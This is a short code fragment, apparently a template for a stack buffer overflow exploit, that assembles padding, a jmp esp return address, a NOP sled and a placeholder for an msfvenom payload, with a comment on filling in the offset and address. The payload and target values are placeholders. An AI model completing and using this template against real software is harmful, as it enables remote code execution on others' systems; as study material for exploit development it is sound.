...
buf = "msfvenom overflow payload here"

shellcode = "A" * num + "jmp esp" + "\x90" * 32 + buf #replace num with exact pattern offset, and jmp esp with the module number, backwards
